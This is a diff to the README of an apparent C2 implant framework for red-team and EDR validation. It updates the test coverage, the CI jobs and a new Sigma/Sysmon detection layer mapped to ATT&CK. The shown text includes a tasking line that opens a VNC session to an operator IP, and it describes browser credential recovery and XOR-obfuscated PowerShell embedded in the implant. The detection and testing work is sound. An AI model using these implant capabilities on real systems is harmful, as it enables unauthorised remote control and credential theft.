@@ -665,7 +665,7 @@ python server/c2_cli.py task <sid> "!vnc <operator-ip>:5500"
 
 | Command | Coverage |
 |---|---|
-| `python tests/test_protocol.py` | **27 checks** against a live server instance: ECDH handshake, encrypt/decrypt round trips with tricky payloads, task/result flow, `tid` delivery + ack, at-least-once retry, duplicate-result dedup, replay-counter rejection, re-handshake after server restart |
+| `python tests/test_protocol.py` | **34 checks** against a live server instance: ECDH handshake, encrypt/decrypt round trips with tricky payloads, task/result flow, `tid` delivery + ack, at-least-once retry, duplicate-result dedup, replay-counter rejection, re-handshake after server restart, and wire-Base64 canonicality against the implant's strict decoder |
 | `powershell -File tests/test_browser.ps1` | `!browser` recovery logic against a **synthetic** profile in `%TEMP%` — one `v10` AES-GCM row and one legacy DPAPI row; no real browser data is read or touched |
 | `python tests/verify_chunks.py` | Asserts the XOR chunks embedded in `src/c2.cpp` reconstruct `tests/browser_dump.ps1` **byte-for-byte** |
 | `python tests/gen_browser_chunks.py` | Regenerates those chunks — run it after editing `browser_dump.ps1`, the PowerShell file is the single source of truth |
@@ -676,21 +676,38 @@ the implant ships the compiled-out chunk form of its library section.
 ### Continuous integration
 
 [`.github/workflows/ci.yml`](.github/workflows/ci.yml) gates every push to `main` and every pull
-request with two jobs on `ubuntu-latest`:
+request with three jobs on `ubuntu-latest`:
 
 1. **Protocol tests** — Python 3.11, install `server/requirements.txt`, run `tests/test_protocol.py`.
 2. **Cross-compile** — install `mingw-w64`, build a release implant with placeholder values
    (`ci-build.example.invalid`, non-operational token), then assert the artifact exists and is a
    Windows PE via `file`.
+3. **Detection artifacts** — install `detections/requirements.txt`, run
+   `detections/check_coverage.py`, which validates every Sigma rule and refuses to pass if a
+   technique in the section 16 matrix is neither covered by a rule nor recorded as a known
+   telemetry gap.
 
-A green CI therefore means both "the channel still behaves correctly" and "the implant still
-builds warning-clean", without any live implant involved.
+A green CI therefore means "the channel still behaves correctly", "the implant still builds
+warning-clean", and "the detection layer still accounts for itself", without any live implant
+involved.
+
+### Detection layer
+
+[`detections/`](detections/) holds the defensive half: a Sysmon collection profile, 19 Sigma
+rules mapped to the section 16 matrix, and the coverage gate CI runs. Start with
+[`detections/README.md`](detections/README.md), which states plainly which techniques these rules
+cannot see and why.
 
 ---
 
 ## 16. MITRE ATT&CK mapping
 
 Every implanted technique is a detection test case — validate an EDR against one row at a time.
+
+The rules implementing this mapping live in [`detections/sigma/`](detections/sigma/), with the
+collector profile at [`detections/sysmon/sysmon-ghost.xml`](detections/sysmon/sysmon-ghost.xml).
+`python detections/check_coverage.py --report` prints, per row, whether a rule covers it or the
+reason it cannot be detected from Windows event telemetry.
 
 | Technique | ATT&CK | Module |
 |---|---|---|
